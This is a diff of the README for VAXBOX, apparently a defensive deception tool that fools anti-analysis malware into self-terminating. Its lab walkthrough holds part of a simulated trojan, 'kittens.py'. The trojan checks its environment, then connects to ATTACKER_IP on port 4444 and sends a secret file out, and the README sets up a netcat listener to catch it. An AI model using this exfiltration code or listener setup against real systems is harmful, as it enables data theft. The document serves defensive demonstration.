@@ -1,5 +1,4 @@
-```markdown
-# 💉 Active Deception Vaccine (VAXBOX v4.0)
+# 💉 Active Deception Vaccine (VAXBOX)
 
 An elegant, lightweight proactive active-defense tool developed in Python for Linux environments (Kali Linux Cores). It implements core concepts of **Cyber Deception** and **Hardware Gaslighting** to trick sophisticated anti-analysis malware into automatic self-destruction. 
 
@@ -25,7 +24,7 @@ Instead of traditional reactive defense (chasing malware after infection), this 
   - Performs an automated diagnostic sweep across the OS and memory to verify that all deceptive traps and defensive shields are active and running.
 
 * **3) Module 3: Generate Advanced Audit Report:**
-  - Mines live process data and compiles an immediate technical report mapped with live PIDs and timestamps, dedicated to **DFIR (Digital Forensics & Incident Response)** analysts to prove system immunization.
+  - Compiles a technical overview report logging all active deceptive indicators and live process PIDs for immediate environment verification.
 
 * **4) Module 4: Secure Rollback & Purge:**
   - Completely cleanses the environment by safely removing all injected mutexes, terminating the ghost processes, and deleting fake profiles with **Zero Resource Leak**.
@@ -39,7 +38,7 @@ You can reproduce this exact lab scenario on your own Kali Linux environment to 
 ### 🛑 Pre-requisite Notes:
 1. The tool requires **ROOT** privileges to interact with Shared Memory and Kernel process mapping.
 2. When testing, remember to **change the IP** inside the Trojan script to match your attacker machine's IP address.
-3. You must start your **Listener** on the attacker machine to capture the reverse connection before launching the attack.
+3. You must start your **Ncat / Netcat Listener** on the attacker machine to capture the reverse connection before launching the attack.
 
 ---
 
@@ -101,7 +100,7 @@ def scan_environment_and_attack():
         sys.exit(0)
 
     # 4. Payload Execution Phase (Fires if no defensive indicators are present)
-    print("\n\033[91m[☠] SUCCESS: No active defenses found! Exfiltrating secret files and opening Reverse Shell...\033[0m")
+    print("\n\033[91m[☠] SUCCESS: No active defenses found! Executing attack payload...\033[0m")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ATTACKER_IP, ATTACKER_PORT))
@@ -124,7 +123,7 @@ if __name__ == "__main__":
 
 ### 📡 Step 3: Launch the Attacker Listener
 
-On your attacker machine/terminal window, spin up a Netcat listener on port `4444` to catch the incoming exfiltrated file buffer:
+On your attacker machine/terminal window, spin up an **Ncat / Netcat** listener on port `4444` to catch the incoming exfiltrated file buffer:
 
 ```bash
 nc -lvnp 4444
@@ -143,7 +142,7 @@ python3 kittens.py
 ```
 
 **🔴 Observed Result (Successful Attack):**
-The Trojan passes its environment validation seamlessly because no deceptive markers exist. It immediately accesses `/tmp/top_secret.txt` and transmits the bank account data straight to your open Netcat listener screen.
+The Trojan passes its environment validation seamlessly because no deceptive markers exist. It immediately accesses `/tmp/top_secret.txt` and transmits the data straight to your open Ncat listener screen.
 
 ---
 
@@ -200,9 +199,8 @@ sudo python3 vaxbox.py
 
 * **Shouq Aldawsari**
 
----
-
 > 💡 **Note:** You don't need to copy and paste the code manually. Both the main tool `vaxbox.py` and the simulated trojan `kittens.py` are already included in this repository. You can run them directly after cloning!
+
 ---
 
 ## 📄 License & Disclaimer
